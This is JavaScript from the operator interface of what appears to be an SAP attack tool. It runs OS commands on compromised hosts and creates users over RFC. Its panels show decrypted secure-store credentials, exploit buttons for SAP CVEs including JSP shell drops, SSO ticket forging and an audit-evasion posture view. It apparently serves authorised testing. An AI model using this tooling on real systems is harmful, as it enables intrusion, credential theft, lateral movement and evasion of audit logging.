  const endpoint = _osExecuteCtx.channel === 'ctcws'
    ? 'ctcws_osexecute' : 'sapcontrol_osexecute';
  const r = await api('POST', `node/${_osExecuteCtx.sid}/${endpoint}`, {
    destination_name: _osExecuteCtx.destName,
    command: cmd,
    timeout: timeout,
  });
  if (r && r.error) {
    outEl.textContent = `[-] Error: ${r.error}`;
    return;
  }
  const wrapped = (r.command_sent && r.command_sent !== cmd)
    ? `[*] Wrapped as: ${r.command_sent}\n` : '';
  const header = `[+] exit=${r.exit_code}  pid=${r.pid}  status=HTTP ${r.status}\n`
                + wrapped
                + `----- output (${(r.output||'').length} bytes) -----\n`;
  outEl.textContent = header + (r.output || '<no output>');
  outEl.scrollTop = 0;
}

// Generic dispatcher — routes BTP-sourced edges to /api/btp/* endpoints,
// everything else to the existing per-node endpoints.  Same payload either
// way so the modal poller doesn't need to know which path was taken.
async function testConnection(sid, destName, connIdx) {
  // Immediate visual feedback in the top activity bar; the server-side
  // _bg task will take over once polling catches up. Short hold — the
  // test itself usually completes in well under 5 s and the operator
  // doesn't want stale "testing…" lingering after success.
  flashActivity(`${sid}: testing destination ${destName}`, 3500);
  if ((sid || '').startsWith('BTP:')) {
    await api('POST', 'btp/test_destination', {
      source_sid: sid, destination_name: destName });
  } else {
    await api('POST', `node/${sid}/test_rfc_single`, {
      destination_name: destName });
  }
  startPolling();
}

// Issue #23 layer 4 — canary create+delete probe.  Explicit
// operator confirmation required because it leaves a real audit
// trail on the target.
async function runCanaryCreate(sourceSid, destName) {
  const ok = confirm(
    `Canary create-user probe on ${destName}:\n\n` +
    `Creates a SAPMAP_CANARY_<ts> user via BAPI_USER_CREATE1 and\n` +
    `immediately deletes it via BAPI_USER_DELETE.  Definitively\n` +
    `answers "can this RFC user create users?" — but leaves BOTH\n` +
    `events in the target's SAL audit log.\n\n` +
    `Continue?`);
  if (!ok) return;
  flashActivity(
    `${sourceSid}: canary create-user probe on ${destName}`, 6000);
  await api('POST', `node/${sourceSid}/canary_create_user`, {
    destination_name: destName, confirm: true });
  startPolling();
}

async function createUserOnTarget(sourceSid, destName, targetSid) {
  document.getElementById('info-panel').classList.remove('visible');
  flashActivity(
    `${sourceSid} → ${targetSid}: creating remote user via ${destName}`,
    6000);
  if ((sourceSid || '').startsWith('BTP:')) {
    await api('POST', 'btp/create_user_on_target', {
      source_sid: sourceSid, destination_name: destName, target_sid: targetSid });
  } else {
    await api('POST', `node/${sourceSid}/create_user_via_rfc`, {
      destination_name: destName, target_sid: targetSid });
  }
  startPolling();
}

// --- Detail panel ---
function getPhaseProgress(n, sid) {
  // Derive 5-phase assessment state from node fields.
  // Returned array is fed to renderPhaseProgress() below.
  if (!n) return [];
  const sysType = ((n.system_type || '') + '').toUpperCase();
  const isJava = sysType.indexOf('JAVA') !== -1;

  // Phase 1: Scan — node has been fingerprinted (has instances).
  const scanned = (n.instances || []).length > 0
                  || !!n.system_type || !!n.kernel;

  // Phase 2: Vulns Checked — at least one vulnerability check ran on
  // this node (either found something or explicitly checked-and-safe).
  const vulnsChecked = !!(n.gw_vulnerable || n.ms_vulnerable
                          || n.ms_acl_protected
                          || n.cve_2025_31324_checked
                          || n.cve_2020_6287_checked
                          || n.cve_2022_22536_checked
                          || n.ms_port);

  // Phase 3: Exploited — node is fully compromised.
  const exploited = !!n.pwned;

  // Phase 4: Extracted — data pulled after pwn (secstore / Java secstore /
  // RFC destinations discovered).  Ignore auto-populated single-conn edges
  // from CVE-31324 shells — require secstore OR ≥2 outbound RFCs.
  const rfcCount = (mapState.connections || [])
    .filter(c => c.source_sid === sid).length;
  const extracted = !!((n.secstore_entries || []).length
                       || n.java_secstore_checked
                       || rfcCount >= 2);

  // Phase 5: Propagated — at least one outbound RFC connection to a
  // now-pwned target (i.e. we used this node to compromise another).
  const propagated = (mapState.connections || []).some(c => {
    if (c.source_sid !== sid || !c.target_sid) return false;
    const tgt = (mapState.nodes || {})[c.target_sid];
    return tgt && tgt.pwned;
  });

  // Active = first not-done phase.  Everything before is 'done', the
  // active step gets the highlight ring.
  const flags = [scanned, vulnsChecked, exploited, extracted, propagated];
  let activeIdx = flags.findIndex(f => !f);
  if (activeIdx === -1) activeIdx = flags.length;   // all done

  const labels = ['Scan', 'Vulns', 'Exploit', 'Extract', 'Move'];
  return labels.map((label, i) => ({
    label,
    done:   flags[i],
    active: i === activeIdx,
  }));
}

function getSCCPhaseProgress(sn) {
  // 5-phase view aligned with the SAP-node bar so the UI reads the same:
  //   Scan   — SCC fingerprinted (host + admin UI probed)
  //   Vulns  — version-based CVE bucketing produced any hits, or default
  //            creds probe attempted (default_creds_live one way or the
  //            other), or a cred was captured
  //   Auth   — we hold an admin session (captured cred, admin_session_obtained,
  //            or default_creds_live)
  //   Extract— mappings pulled OR keystore extracted OR ssfs decrypted
  //   Move   — PP analyser has run OR tunnel replay confirmed
  if (!sn) return [];
  const scanned = !!(sn.admin_ui_reachable || sn.version || sn.bundle_hash);
  const vulnsChecked = !!((sn.cves_confirmed || []).length
                          || (sn.cves_suspected || []).length
                          || sn.default_creds_live
                          || (sn.credentials || []).length);
  const authed = !!(sn.admin_session_obtained || sn.default_creds_live
                    || (sn.credentials || []).length);
  const extracted = !!((sn.mappings || []).length
                       || sn.keystore_extracted
                       || sn.ssfs_decrypted);
  const moved = !!(sn.tunnel_replayed
                   || (sn.pp_analysis && sn.pp_analysis.method));
  const flags = [scanned, vulnsChecked, authed, extracted, moved];
  let activeIdx = flags.findIndex(f => !f);
  if (activeIdx === -1) activeIdx = flags.length;
  const labels = ['Scan', 'Vulns', 'Auth', 'Extract', 'Move'];
  return labels.map((label, i) => ({
    label, done: flags[i], active: i === activeIdx,
  }));
}

function getBTPPhaseProgress(bn) {
  // 5-phase view aligned with the SAP + SCC bars:
  //   Discover — subaccount landed on the map (uuid + region known)
  //   Token    — an operator token minted for this region (in mapState)
  //   Enum     — /destinations enumerated (at least one destination row)
  //   Extract  — at least one destination carries a cleartext password
  //   Move     — a destination has been linked to an on-prem SAPNode
  //              (or we hold cert-auth-trusted status from a real probe)
  if (!bn) return [];
  const discovered = !!(bn.uuid || bn.region);
  const region = (bn.region || '').toLowerCase();
  const haveToken = (mapState.btp_token_regions || [])
    .some(r => (r || '').toLowerCase() === region);
  const dests = bn.destinations || [];
  const enumerated = dests.length > 0;
  const extracted = dests.some(d => d && (d.cleartext_captured || d.password));
  const moved = !!(bn.cert_auth_trusted
                   || dests.some(d => d && d.linked_target_sid));
  const flags = [discovered, haveToken, enumerated, extracted, moved];
  let activeIdx = flags.findIndex(f => !f);
  if (activeIdx === -1) activeIdx = flags.length;
  const labels = ['Discover', 'Token', 'Enum', 'Extract', 'Move'];
  return labels.map((label, i) => ({
    label, done: flags[i], active: i === activeIdx,
  }));
}

function renderPhaseProgress(phases) {
  if (!phases || !phases.length) return '';
  const parts = ['<div class="phase-progress" title="Assessment phase — filled = done, ring = next step">'];
  phases.forEach((p, i) => {
    if (i > 0) {
      // Connector between step i-1 and step i: green when i-1 is done.
      const cls = phases[i-1].done ? 'phase-connector done' : 'phase-connector';
      parts.push(`<div class="${cls}"></div>`);
    }
    const cls = 'phase-step' + (p.done ? ' done' : '') + (p.active ? ' active' : '');
    parts.push(`<div class="${cls}"><div class="phase-dot"></div>`
             + `<div class="phase-label">${p.label}</div></div>`);
  });
  parts.push('</div>');
  return parts.join('');
}

function showDetails(sid, opts) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  const refresh = !!(opts && opts.refresh);
  if (!refresh && panel.classList.contains('visible') && panel.dataset.sid === sid) {
    _closeDetailPanel();
    return;
  }
  // Preserve scroll position on refresh so live updates don't yank the
  // panel back to the top while the operator is reading.
  const preservedScroll = refresh ? (panel.scrollTop || 0) : 0;
  // Snapshot which SecStore entries are currently revealed so the
  // innerHTML rebuild doesn't flip them back to masked.
  const revealedSS = new Set();
  if (refresh) {
    panel.querySelectorAll('.ss-reveal').forEach((row, i) => {
      const m = row.querySelector('.ss-masked');
      if (m && m.style.display === 'none') revealedSS.add(i);
    });
  }
  panel.dataset.sid = sid;
  panel.setAttribute('data-view', 'details');
  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>${escHtml(n.sid)} System Details</h3>
    ${renderPhaseProgress(getPhaseProgress(n, sid))}
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">SID</span><span class="detail-val">${escHtml(n.sid)}</span></div>
      <div class="detail-row"><span class="detail-key">Type</span><span class="detail-val">${escHtml(n.system_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Hostname</span><span class="detail-val">${escHtml(n.hostname)}</span></div>
      <div class="detail-row"><span class="detail-key">IP</span><span class="detail-val">${escHtml(n.ip)}</span></div>
      <div class="detail-row"><span class="detail-key">OS</span><span class="detail-val">${escHtml(n.os_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Database</span><span class="detail-val">${escHtml(n.db_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Kernel</span><span class="detail-val">${escHtml(n.kernel)}</span></div>
      <div class="detail-row"><span class="detail-key">SAP Release</span><span class="detail-val">${escHtml(n.sap_release)}</span></div>
      <div class="detail-row"><span class="detail-key">Production</span><span class="detail-val">${n.is_production ? '<span style="color:#f85149">YES</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${n.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">GW Vulnerable</span><span class="detail-val">${n.gw_vulnerable ? `<span style="color:#f85149">YES — SAPXPG</span>${!n.pwned ? `<span class="detail-action-btn" onclick="selectedNodeSid='${escHtml(n.sid)}';ctxAction('create_user_gw')">Exploit →</span>` : ''}` : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">MS Vulnerable</span><span class="detail-val">${
        n.ms_vulnerable ? `<span style="color:#f85149">YES — betrusted (port ${n.ms_port})</span>` + (!n.pwned ? `<span class="detail-action-btn" onclick="selectedNodeSid='${escHtml(n.sid)}';ctxAction('create_user_betrusted')">Exploit →</span>` : '')
        : n.ms_acl_protected ? `<span style="color:#d29922">ACL protected (port ${n.ms_port})</span>`
        : n.ms_port ? `<span style="color:#3fb950">Port ${n.ms_port} open</span>`
        : 'Not checked'
      }</span></div>
      ${(n.system_type || '').toUpperCase().indexOf('JAVA') !== -1 ? `
      <div class="detail-row"><span class="detail-key">CVE-2025-31324</span><span class="detail-val">${
        n.cve_2025_31324_vulnerable
          ? `<span style="color:#f85149">YES — metadatauploader RCE (port ${n.cve_2025_31324_port}${n.cve_2025_31324_https ? ' HTTPS' : ''})</span>` + (!n.pwned ? `<span class="detail-action-btn" onclick="selectedNodeSid='${escHtml(n.sid)}';ctxAction('exploit_cve_31324_drop')">Exploit →</span>` : '')
          : n.cve_2025_31324_checked
            ? `<span style="color:#3fb950">Not vulnerable</span><span style="color:#8b949e"> · ${escHtml(n.cve_2025_31324_evidence || '')}</span>`
            : 'Not checked'
      }${(n.cve_2025_31324_shells || []).length
          ? ` · <span style="color:#f0883e">${(n.cve_2025_31324_shells || []).length} JSP shell(s) dropped</span>`
          : ''}</span></div>` : ''}
      ${(n.system_type || '').toUpperCase().indexOf('JAVA') !== -1 ? `
      <div class="detail-row"><span class="detail-key">CVE-2020-6287</span><span class="detail-val">${
        n.cve_2020_6287_vulnerable
          ? `<span style="color:#f85149">YES — RECON unauth admin (port ${n.cve_2020_6287_port}${n.cve_2020_6287_https ? ' HTTPS' : ''})</span>` + (!n.pwned ? `<span class="detail-action-btn" onclick="selectedNodeSid='${escHtml(n.sid)}';ctxAction('create_user_java')">Exploit →</span>` : '')
          : n.cve_2020_6287_checked
            ? `<span style="color:#3fb950">Not vulnerable</span><span style="color:#8b949e"> · ${escHtml(n.cve_2020_6287_evidence || '')}</span>`
            : 'Not checked'
      }</span></div>` : ''}
      ${n.saprouter ? `<div class="detail-row"><span class="detail-key">SAProuter</span><span class="detail-val" style="color:#d29922">${escHtml(n.saprouter)}</span></div>` : ''}
      ${n.java_secstore_checked ? `
      <div class="detail-row"><span class="detail-key">Java Secure Store</span><span class="detail-val">${
        (() => {
          // Apply the same noise filter the modal uses by default, so
          // the summary counts match what the operator actually sees.
          const isNoise = (e) => {
            const nm = e.name || '';
            return /childinstance/i.test(nm)
                || /^#~data-source-aliases\.xml$/i.test(nm)
                || /^#~secured property/i.test(nm)
                || (e.kind || '').toLowerCase() === 'undecryptable';
          };
          const visible = (n.java_secstore_entries || []).filter(e => !isNoise(e));
          const hidden  = (n.java_secstore_entries || []).length - visible.length;
          const fe = visible.filter(e => (e.source || '') === 'SecStore.properties').length;
          const ce = visible.filter(e => (e.source || '').startsWith('J2EE_CONFIGENTRY')).length;
          const ds = Array.from(new Set(visible.filter(e => e.is_downstream).map(e => e.target_sid))).filter(Boolean);
          return `<span style="color:#f85149">${visible.length} entries decrypted</span>` +
                 ` <span style="color:#8b949e">(${fe} file · ${ce} configentry` +
                 (ds.length ? ` · downstream: ${escHtml(ds.join(', '))}` : '') +
                 (hidden ? ` · ${hidden} noise hidden` : '') +
                 `)</span> · alg=${escHtml((n.java_secstore_algorithm || '').slice(0, 60))}` +
                 ` <a href="javascript:void(0)" onclick="showJavaSecStoreModal('${escHtml(n.sid)}')" style="color:#58a6ff">view all →</a>`;
        })()
      }</span></div>` : ''}
    </div>
    ${n.java_secstore_checked && (n.java_secstore_entries || []).length ? `
    <div class="detail-section" style="user-select:text;-webkit-user-select:text">
      <h4 style="margin:0 0 8px;color:#f0883e">&#128273; Java Secure Store entries</h4>
      <div style="font-size:10px;color:#8b949e;margin-bottom:6px">Click a row to copy the value · <a href="javascript:void(0)" onclick="showJavaSecStoreModal('${escHtml(n.sid)}')" style="color:#58a6ff">open full modal</a></div>
      <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px;user-select:text">
        <thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">
          <th style="text-align:left;padding:3px 6px">Source</th>
          <th style="text-align:left;padding:3px 6px">Name</th>
          <th style="text-align:left;padding:3px 6px">Value</th>
        </tr></thead>
        <tbody>
        ${(() => {
          // Same noise filter as the modal + summary.  We render up
          // to 25 non-noise rows inline so the operator sees real
          // credentials without opening the modal.
          const isNoise = (e) => {
            const nm = e.name || '';
            return /childinstance/i.test(nm)
                || /^#~data-source-aliases\.xml$/i.test(nm)
                || /^#~secured property/i.test(nm)
                || (e.kind || '').toLowerCase() === 'undecryptable';
          };
          const visible = (n.java_secstore_entries || []).filter(e => !isNoise(e));
          const head = visible.slice(0, 25);
          const overflow = visible.length - head.length;
          const body = head.map(e => {
            const isPw = /pass|pwd|secret|credential/i.test(e.name || '');
            let v = e.value || '';
            if (isPw && v.length > 0) v = '•'.repeat(Math.min(v.length, 8)) + ' (' + v.length + 'B)';
            v = String(v).replace(/(password\s*=)[^&;\s]+/gi, '$1***');
            if (v.length > 200) v = v.slice(0, 200) + '… [open full modal]';
            const ds = e.is_downstream ? ' style="color:#f85149"' : '';
            return `<tr${ds}>` +
              `<td style="padding:3px 6px;color:#8b949e">${escHtml((e.source || '').replace('SecStore.properties', 'file').replace('J2EE_CONFIGENTRY', 'cfg'))}</td>` +
              `<td style="padding:3px 6px">${escHtml(e.name)}</td>` +
              `<td style="padding:3px 6px;word-break:break-all">${escHtml(v)}</td>` +
            `</tr>`;
          }).join('');
          const more = overflow > 0
            ? `<tr><td colspan="3" style="padding:6px;color:#8b949e;text-align:center">… ${overflow} more — open full modal</td></tr>`
            : '';
          const emptyNote = visible.length === 0
            ? `<tr><td colspan="3" style="padding:6px;color:#8b949e;text-align:center;font-style:italic">All ${(n.java_secstore_entries || []).length} entries filtered as noise — open the modal and tick "Show noise" to inspect</td></tr>`
            : '';
          return body + more + emptyNote;
        })()}
        </tbody>
      </table>
    </div>` : ''}
    ${(() => {
      const ri = n.saprouter_info || {};
      if (!ri.vulnerable) return '';
      const sid = n.sid;
      const clients = ri.clients || [];
      // Build connection table (mirrors "saprouter -l" output)
      const connTable = clients.length === 0
        ? '<div style="color:#484f58;font-size:11px;margin:4px 0">No active connections</div>'
        : '<table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px;margin:6px 0">' +
          '<thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">' +
          '<th style="text-align:right;padding:2px 8px 2px 0;white-space:nowrap">ID</th>' +
          '<th style="text-align:left;padding:2px 8px">CLIENT</th>' +
          '<th style="text-align:left;padding:2px 8px">PARTNER</th>' +
          '<th style="text-align:right;padding:2px 0">service</th>' +
          '</tr></thead><tbody>' +
          clients.map(c => {
            const hasPartner = c.partner && c.partner !== '(no partner)';
            const partnerCol = hasPartner
              ? '<span style="color:#58a6ff">' + escHtml(c.partner) + '</span>'
              : '<span style="color:#484f58">(no partner)</span>';
            const svcCol = c.service
              ? '<span style="color:#3fb950">' + escHtml(c.service) + '</span>'
              : '<span style="color:#484f58">—</span>';
            const srcCol = c.ip && c.ip !== c.source
              ? escHtml(c.source) + ' <span style="color:#484f58">(' + escHtml(c.ip) + ')</span>'
              : '<span style="color:#d29922">' + escHtml(c.source || '?') + '</span>';
            return '<tr style="border-bottom:1px solid #21262d">' +
              '<td style="text-align:right;padding:3px 8px 3px 0;color:#484f58">' + escHtml(String(c.id ?? '')) + '</td>' +
              '<td style="padding:3px 8px">' + srcCol + '</td>' +
              '<td style="padding:3px 8px">' + partnerCol + '</td>' +
              '<td style="text-align:right;padding:3px 0">' + svcCol + '</td>' +
              '</tr>';
          }).join('') +
          '</tbody></table>';
      return '<div class="detail-section">' +
        '<h4 style="color:#f85149">&#128268; SAProuter Info Leak (Vulnerable!)</h4>' +
        '<div class="detail-row"><span class="detail-key">Working Dir</span><span class="detail-val">' + escHtml(ri.working_dir || '?') + '</span></div>' +
        '<div class="detail-row"><span class="detail-key">Routtab</span><span class="detail-val">' + escHtml(ri.routtab || '?') + '</span></div>' +
        '<div class="detail-row"><span class="detail-key">Connections</span><span class="detail-val">' + (ri.total_clients || clients.length || 0) + '</span></div>' +
        connTable +
        '<div style="margin-top:8px"><button class="btn btn-primary" style="font-size:11px;padding:3px 10px" onclick="selectedNodeSid=\'' + escHtml(sid) + '\';showRouterScanModal(\'' + escHtml(sid) + '\')">&#128270; Scan Internally via this SAProuter</button></div>' +
        '</div>';
    })()}
    ${(() => {
      const s = n.snc_info || {};
      if (!s.checked) return '';
      const sid = n.sid;
      let title, color, body;
      if (s.error && !s.enabled) {
        title = '&#128274; SNC: probe failed';
        color = '#8b949e';
        body = '<div class="detail-row"><span class="detail-key">Error</span><span class="detail-val">' + escHtml(s.error) + '</span></div>';
      } else if (!s.enabled) {
        title = '&#128275; SNC: not enabled';
        color = '#d29922';
        body = '<div style="color:#8b949e;font-size:11px;margin:4px 0">DIAG/Router traffic is unencrypted on the wire. SAP recommends snc/enabled=1 + snc/data_protection/min=3 for production.</div>';
      } else {
        title = '&#128274; SNC: enabled';
        color = '#3fb950';
        const qopRow = (label, val) => {
          const lvl = ['INVALID','OPEN','INTEGRITY','PRIVACY'][val] || '?';
          const c = val === 3 ? '#3fb950' : '#d29922';
          return '<div class="detail-row"><span class="detail-key">' + label + '</span><span class="detail-val" style="color:' + c + '">' + val + ' (' + lvl + ')</span></div>';
        };
        body =
          '<div class="detail-row"><span class="detail-key">Protocol</span><span class="detail-val">' + escHtml(s.protocol || '') + '</span></div>' +
          (s.mech_label ? '<div class="detail-row"><span class="detail-key">Mechanism</span><span class="detail-val">' + escHtml(s.mech_label) + '</span></div>' : '') +
          (s.cryptolib ? '<div class="detail-row"><span class="detail-key">CryptoLib</span><span class="detail-val" style="font-family:monospace;font-size:11px">' + escHtml(s.cryptolib) + '</span></div>' : '') +
          qopRow('QoP use', s.qop_use || 0) +
          qopRow('QoP max', s.qop_max || 0) +
          qopRow('QoP min', s.qop_min || 0);
        if (s.protocol === 'diag') {
          const enfColor = s.enforced ? '#3fb950' : '#d29922';
          body += '<div class="detail-row"><span class="detail-key" title="snc/only_encrypted_gui">Enforced</span><span class="detail-val" style="color:' + enfColor + '">' + (s.enforced ? 'yes (snc/only_encrypted_gui=1)' : 'no (snc/only_encrypted_gui=0)') + '</span></div>';
        }
      }
      return '<div class="detail-section">' +
        '<h4 style="color:' + color + '">' + title + '</h4>' +
        body +
        '<div style="margin-top:6px"><button class="btn" style="font-size:11px;padding:3px 10px" ' +
        'onclick="api(\'POST\',\'node/' + escHtml(sid) + '/check_snc\');showToast(\'SNC probe started for ' + escHtml(sid) + '\',\'info\')">Re-probe SNC</button></div>' +
        '</div>';
    })()}
    ${(() => {
      const acl = n.rfcsysacl_entries || [];
      if (!acl.length) return '';
      const eqy = acl.filter(e => e.rfcequser === 'Y');
      const color = eqy.length ? '#f0883e' : '#8b949e';
      let rows = '';
      acl.forEach(e => {
        const eq = e.rfcequser === 'Y';
        const eqColor = eq ? '#f0883e' : '#8b949e';
        rows += '<div class="detail-row">' +
          '<span class="detail-key">' + escHtml(e.rfcsysid || '?') +
          ' / ' + escHtml(e.rfcclient || '?') + '</span>' +
          '<span class="detail-val" style="color:' + eqColor + '">' +
          'RFCEQUSER=' + escHtml(e.rfcequser || '?') +
          (e.rfcuser ? ' user=' + escHtml(e.rfcuser) : '') +
          (eq ? ' &#9888; any user' : '') +
          '</span></div>';
      });
      return '<div class="detail-section">' +
        '<h4 style="color:' + color + '">&#128279; Inbound Trusted RFC (' +
        acl.length + ' entries' +
        (eqy.length ? ', ' + eqy.length + ' RFCEQUSER=Y' : '') +
        ')</h4>' +
        (eqy.length ? '<div style="color:#d29922;font-size:11px;margin-bottom:6px">Systems with RFCEQUSER=Y can log in as any same-named user on this system without a password.</div>' : '') +
        rows + '</div>';
    })()}
    ${(() => {
      const ux = n.usrextid_entries || [];
      if (!ux.length) return '';
      let rows = '';
      ux.slice(0, 12).forEach(e => {
        const src = e.source || '';
        const t = src.includes(':') ? src.split(':')[1] : '?';
        rows += '<div class="detail-row">' +
          '<span class="detail-key">' + escHtml(e.bname || '?') +
          ' &larr; ' + escHtml(t) + '</span>' +
          '<span class="detail-val" style="font-family:monospace;font-size:11px">' +
          escHtml(e.extid || '') + '</span></div>';
      });
      const more = ux.length > 12 ?
        '<div style="color:#8b949e;font-size:11px;margin-top:4px">... ' +
        (ux.length - 12) + ' more</div>' : '';
      return '<div class="detail-section">' +
        '<h4 style="color:#8b949e">&#128100; USREXTID Identity Mappings (' +
        ux.length + ')</h4>' +
        '<div style="color:#8b949e;font-size:11px;margin-bottom:6px">External user identities (X.509 DN / LDAP DN / SAML / email). Intelligence only — not used for ticket forgery.</div>' +
        rows + more + '</div>';
    })()}
    ${(() => {
      // OPSEC audit-posture badges from the read-only telemetry probe.
      // Doesn't render when the operator hasn't run it; encourages a
      // probe via the right-click context menu.
      const tp = n.telemetry_profile;
      if (!tp) return '';
      // Tooltip text per parameter — hover any badge to see what the
      // value means and why it matters for evasion / detection.
      const DOCS = {
        'rsau/enable':
          'Security Audit Log master switch. 0/blank = SAL off (no audit '
          + 'records written at all). 1 = SAL on. Kernel default is 0; '
          + 'production systems should run with 1.',
        'slots':
          'Populated filter slots (left) / kernel-allocated filter slots '
          + '(right). Configured count comes from rsau/selection_slots — '
          + 'how many (user, client, audit-class) tuples the kernel will '
          + 'accept. Populated comes from RSAU_PERS / RSAUPROF and is '
          + 'often 0 even when SAL is on, because runtime slots live in '
          + 'kernel memory rather than these persistence tables. [broad] '
          + '= at least one slot matches all users AND all clients '
          + '(USERSEL=\'*\', CLISEL=\'*\') — very high-volume audit '
          + 'profile.',
        'rsau/integrity':
          'HMAC signing of .AUD files. 1 = kernel signs each record so '
          + 'offline tampering is detectable. 0 = an operator with file '
          + 'access can rewrite SAL records without leaving an integrity '
          + 'breadcrumb.',
        'rsau/ip_only':
          'Source-field hardening in SAL. 1 = kernel uses the TCP source '
          + 'IP in the Source field, ignoring the client-supplied '
          + 'terminal name. 0 = kernel trusts the terminal-name string '
          + 'the client sent in the DIAG/RFC handshake (SAP Note 1497445); '
          + 'OFF makes attribution unreliable.',
        'rec/client':
          'DBTABLOG (table-change logging) scope. OFF = no table change '
          + 'logs. ALL = every client logged. <n> = specific client. '
          + 'Required to log CDHDR/CDPOS changes for tables marked '
          + 'log-relevant in DD09L.',
        'stat/level':
          'STAD workload statistics level. 0 = STAD disabled (no per-'
          + 'transaction stats). 1+ = STAD on. STAD is one of the few '
          + 'channels that captures what an operator did — turning it '
          + 'off mid-op blinds workload monitoring.',
        'gw/logging':
          'Gateway access-log configuration string (multi-value: ACTION=, '
          + 'LOGFILE=, SWITCHTF=, MAXSIZEKB=, ...). Empty / OFF = no '
          + 'gateway logging (registered programs and RFC callbacks are '
          + 'not audited). The often-quoted gw/log_level parameter does '
          + 'not exist on standard kernels.',
        'rdisp/TRACE':
          'Work-process trace verbosity (0-3). 0 = trace off (no dev_w* '
          + 'output). 1 = errors only. 2 = full. 3 = debug. Operators '
          + 'often lower this during an op to suppress dev_rfc / dev_w* '
          + 'file growth.',
      };
      const badge = (paramName, displayValue, risky) => {
        const dot = risky ? '#f85149' : '#3fb950';
        const doc = DOCS[paramName] || '';
        return '<span title="' + escHtml(doc) + '" '
          + 'style="display:inline-flex;align-items:center;gap:4px;'
          + 'background:#0d1117;border:1px solid #30363d;border-radius:4px;'
          + 'padding:2px 8px;font-size:11px;margin:2px 4px 2px 0;'
          + 'cursor:help;max-width:100%">'
          // flex:0 0 6px keeps the dot a perfect 6x6 circle when the
          // badge wraps over multiple lines (gw/logging value is long).
          + '<span style="flex:0 0 6px;width:6px;height:6px;background:'
          + dot + ';border-radius:50%;align-self:center"></span>'
          + '<span style="color:#8b949e">' + escHtml(paramName) + '</span>'
          + '<span style="color:#e6edf3;word-break:break-all">'
          + escHtml(displayValue) + '</span>'
          + '</span>';
      };
      const slotsUsed = tp.sal_filter_slots == null ? 0 : tp.sal_filter_slots;
      const slotsConf = tp.sal_filter_slots_configured || '?';
      const slotsVal = slotsUsed + ' / ' + slotsConf
        + (tp.sal_filter_scope ? ' [' + tp.sal_filter_scope + ']' : '');
      const html = [
        badge('rsau/enable', tp.sal_state, tp.sal_state.startsWith('off')),
        badge('slots', slotsVal, tp.sal_filter_scope === 'broad'),
        badge('rsau/integrity', tp.sal_integrity,
              tp.sal_integrity.startsWith('off')),
        badge('rsau/ip_only', tp.sal_source_ip_only,
              tp.sal_source_ip_only.startsWith('off')),
        badge('rec/client', tp.rec_client,
              (tp.rec_client || '').toUpperCase().startsWith('OFF')),
        badge('stat/level', tp.stat_level,
              (tp.stat_level || '').startsWith('0')),
        badge('gw/logging', tp.gw_logging || 'unknown',
              (tp.gw_logging || '').toUpperCase().startsWith('OFF')
              || (tp.gw_logging || '') === ''),
        badge('rdisp/TRACE', tp.rdisp_trace,
              (tp.rdisp_trace || '').startsWith('0')),
      ].join('');
      const errLine = tp.error
        ? '<div style="color:#d29922;font-size:11px;margin-top:6px">' +
          escHtml(tp.error) + '</div>' : '';
      const probedLine = tp.probed_at
        ? '<div style="color:#484f58;font-size:10px;margin-top:4px">probed ' +
          escHtml(tp.probed_at) + '</div>' : '';
      return '<div class="detail-section">' +
        '<h4 style="color:#8b949e">&#128270; OPSEC Telemetry Posture</h4>' +
        '<div style="color:#8b949e;font-size:11px;margin-bottom:6px">' +
        'Red dot = surface that favours evasion (audit off, integrity off, ' +
        'broad filter slot, ip_only spoofable, trace disabled). ' +
        '<span style="color:#484f58">Hover any badge for parameter docs.</span>' +
        '</div>' +
        '<div>' + html + '</div>' + errLine + probedLine + '</div>';
    })()}
    ${(() => {
      const sid = n.sid;
      const allRels = (mapState.trust_relations || []);
      const outbound = allRels.filter(r => r.issuer_sid === sid);
      const inbound = allRels.filter(r => r.trusting_sid === sid);
      if (!outbound.length && !inbound.length) return '';
      const color = '#f0883e';
      let body = '';
      if (outbound.length) {
        body += '<div style="color:#3fb950;font-size:11px;margin-bottom:4px;font-weight:600">Outbound (systems trusting this node):</div>';
        outbound.forEach(r => {
          const tgt = r.trusting_sid + (r.trusting_client ? '/' + r.trusting_client : '');
          body += '<div class="detail-row">' +
            '<span class="detail-key">' + escHtml(tgt) + '</span>' +
            '<span class="detail-val">' + escHtml(r.discovered_via || r.trust_method || 'trust') + '</span></div>';
        });
      }
      if (inbound.length) {
        body += '<div style="color:#d29922;font-size:11px;margin:6px 0 4px 0;font-weight:600">Inbound (issuers this node trusts):</div>';
        inbound.forEach(r => {
          const src = r.issuer_sid || ('?(' + (r.issuer_cert_subject_dn || '').substring(0, 40) + '...)');
          body += '<div class="detail-row">' +
            '<span class="detail-key">' + escHtml(src) + '</span>' +
            '<span class="detail-val">' + escHtml(r.discovered_via || r.trust_method || 'trust') + '</span></div>';
        });
      }
      return '<div class="detail-section">' +
        '<h4 style="color:' + color + '">&#128293; STRUSTSSO2 Trust (' +
        outbound.length + ' out, ' + inbound.length + ' in)</h4>' +
        body +
        (outbound.length ? '<div style="margin-top:6px"><button class="btn" style="font-size:11px;padding:3px 10px" ' +
          'onclick="contextAction(\'forge_and_fanout\', \'' + escHtml(sid) + '\')">&#128293; Forge &amp; Fanout</button></div>' : '') +
        '</div>';
    })()}
    ${(() => {
      // ATT&CK observed: aggregate technique IDs across this node's
      // findings and group by tactic.  Renders only when at least one
      // finding carries an ATT&CK tag.
      const findings = n.findings || [];
      const allTids = [];
      const seen = new Set();
      findings.forEach(f => (f.attack_techniques || []).forEach(t => {
        if (!seen.has(t)) { seen.add(t); allTids.push(t); }
      }));
      if (!allTids.length) return '';
      const cat = (mapState.attack_catalog) || {};
      const techs = cat.techniques || {};
      const tactics = cat.tactics || {};
      const order = cat.tactic_order || Object.keys(tactics);
      // Group by tactic
